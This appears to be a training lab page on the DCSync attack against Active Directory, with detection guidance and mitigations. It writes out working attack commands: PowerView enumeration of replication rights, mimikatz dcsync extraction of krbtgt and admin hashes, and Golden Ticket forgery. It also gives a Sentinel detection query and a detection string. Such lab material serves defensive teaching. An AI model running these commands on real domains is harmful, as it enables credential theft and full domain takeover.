# Attack Scenario: DC Sync Attack (DCSync)
The DC Sync attack simulates a rogue Domain Controller by abusing Directory Replication permissions. An attacker with sufficient rights can extract password hashes for any user — including krbtgt — from Active Directory, enabling Golden Ticket forgery and full domain compromise.

MITRE ATT&CK Techniques:

T1003.006 – LSASS Memory: DCSync

T1003.003 – NTDS.dit Extraction

T1558.001 – Golden Ticket

## Lab Environment
- **Domain Controller:** dc01.internal.lab
- **Attacker-controlled system:** attacker-vm
- **Privileged account (compromised):** svc-repl with Replicating Directory Changes permissions
- **Target account:** krbtgt, admin.internal.lab

Preconditions:

- svc-repl has Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Secrets rights on the domain root

## Objectives
- Enumerate accounts with replication rights
- Use svc-repl credentials to perform DCSync
- Extract password hashes for high-value targets
- Optionally forge a Golden Ticket using krbtgt hash

## Execution Steps
### 1. Discover Accounts with Replication Rights
Use PowerView:

```Get-ObjectAcl -SamAccountName "internal.lab" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "Replicating" }```

Look for accounts with:

Replicating Directory Changes

Replicating Directory Changes All

Replicating Directory Secrets

### 2. Perform the DCSync
Use mimikatz on attacker host:

```lsadump::dcsync /domain:internal.lab /user:krbtgt```

Can also target specific users:

```lsadump::dcsync /domain:internal.lab /user:admin.internal.lab```
### 3. (Optional) Golden Ticket Attack
Use mimikatz to forge:

```kerberos::golden /user:Administrator /domain:internal.lab /sid:S-1-5-21-xxxxxx /krbtgt:<NTLM HASH> /ptt```

Confirm elevated access:

```dir \\dc01.internal.lab\C$```

## Detection Guidance
Logs and Sources
Event ID 4662 with DS-Replication-Get-Changes, Get-Changes-All, Get-Changes-Secrets

Defender for Identity Alert: "Replication of directory services detected from non-DC host"

Mimikatz strings in memory or command line: 
```lsadump::dcsync```

KQL Example – Microsoft Sentinel
```
SecurityEvent
| where EventID == 4662
| where ObjectType in (
    "DS-Replication-Get-Changes", 
    "DS-Replication-Get-Changes-All", 
    "DS-Replication-Get-Changes-Secrets"
)
| summarize count() by Account, Computer, bin(TimeGenerated, 1h)
| where count_ > 5
```
## Mitigations
Limit accounts with replication rights (use dedicated gMSA for backups)

Use tiered administration; avoid dual-purpose accounts

Monitor 4662 and abnormal LDAP behavior from non-DC hosts

Alert on usage of lsadump::dcsync, replication APIs, or unusual NTLM requests

## References
https://adsecurity.org/?p=1729

https://github.com/gentilkiwi/mimikatz

https://attack.mitre.org/techniques/T1003/006/

## Navigation
← [Back to Lab Index](../README.md)
→ [Related: Golden Ticket](./kerberos/golden-ticket.md)

